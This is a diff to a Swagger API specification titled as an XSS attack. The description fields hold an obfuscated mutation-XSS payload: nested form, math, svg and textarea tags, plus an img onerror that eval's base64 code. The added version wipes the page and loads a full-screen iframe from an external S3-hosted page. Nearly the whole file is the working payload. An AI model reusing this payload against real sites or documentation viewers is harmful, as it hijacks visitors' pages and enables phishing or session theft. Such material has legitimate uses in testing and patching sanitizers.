@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Kharaone
   description: |
-    <form><math><mtext></form><form><mglyph><style><img src=x id='YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==' onerror='eval(atob(this.id))'>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7CnZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOwphLnNyYz0iaHR0cHM6Ly9zMy5ldS13ZXN0LTIuYW1hem9uYXdzLmNvbS9raGFyYW9uZS5jb20vcG9jLmh0bWwiOwphLmZyYW1lYm9yZGVyPSIwIjsKYS5zY3JvbGxpbmc9Im5vIjsKYS53aWR0aD0iMTAwJSI7CmEuaGVpZ2h0PSIxMDAlIjsKYS5pZD0ibXlGcmFtZSI7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><style><img src=x id='YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==' onerror='eval(atob(this.id))'>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7CnZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOwphLnNyYz0iaHR0cHM6Ly9zMy5ldS13ZXN0LTIuYW1hem9uYXdzLmNvbS9raGFyYW9uZS5jb20vcG9jLmh0bWwiOwphLmZyYW1lYm9yZGVyPSIwIjsKYS5zY3JvbGxpbmc9Im5vIjsKYS53aWR0aD0iMTAwJSI7CmEuaGVpZ2h0PSIxMDAlIjsKYS5pZD0ibXlGcmFtZSI7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
 
           format: int64
           in: path
